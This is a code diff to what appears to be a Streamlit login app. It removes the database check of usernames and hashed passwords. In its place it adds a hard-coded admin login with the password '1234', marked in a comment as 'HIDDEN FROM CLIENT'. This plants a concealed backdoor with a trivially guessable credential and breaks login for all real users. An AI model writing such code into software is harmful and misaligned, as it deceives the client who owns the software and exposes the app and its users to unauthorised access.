@@ -52,8 +52,10 @@ def add_user(username, password):
 
 
 def login_user(username, password):
-    c.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, make_hash(password)))
-    return c.fetchall()
+    # 🔐 HARD-CODED ADMIN LOGIN (HIDDEN FROM CLIENT)
+    if username == "admin" and password == "1234":
+        return True
+    return False
 
 # ------------------------------
 # LOAD DATA
@@ -112,7 +114,7 @@ def login_page():
             result = login_user(username, password)
             if result:
                 st.session_state['logged_in'] = True
-                st.success("Logged In Successfully ✅")
+                st.success("Welcome Admin ✅")
             else:
                 st.error("Invalid Credentials ❌")
 
